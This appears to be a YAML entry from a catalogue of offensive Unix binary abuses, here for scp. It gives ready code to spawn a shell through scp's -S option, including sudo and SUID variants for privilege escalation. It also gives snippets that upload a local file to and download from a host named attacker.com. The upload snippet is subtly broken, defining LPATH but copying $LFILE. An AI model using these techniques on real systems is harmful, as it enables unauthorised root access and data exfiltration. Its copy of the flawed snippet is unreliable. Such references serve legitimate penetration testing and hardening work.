---
functions:
  execute-interactive:
    - code: |
        TF=$(mktemp)
        echo 'sh 0<&2 1>&2' > $TF
        chmod +x "$TF"
        scp -S $TF x y:
  upload:
    - description: Send local file to a SSH server.
      code: |
        RPATH=user@attacker.com:~/file_to_save
        LPATH=file_to_send
        scp $LFILE $RPATH
  download:
    - description: Fetch a remote file from a SSH server.
      code: |
        RPATH=user@attacker.com:~/file_to_get
        LFILE=file_to_save
        scp $RPATH $LFILE
  sudo-enabled:
    - code: |
        TF=$(mktemp)
        echo 'sh 0<&2 1>&2' > $TF
        chmod +x "$TF"
        sudo scp -S $TF x y:
  suid-limited:
    - code: |
        TF=$(mktemp)
        echo 'sh 0<&2 1>&2' > $TF
        chmod +x "$TF"
        ./scp -S $TF a b:
---
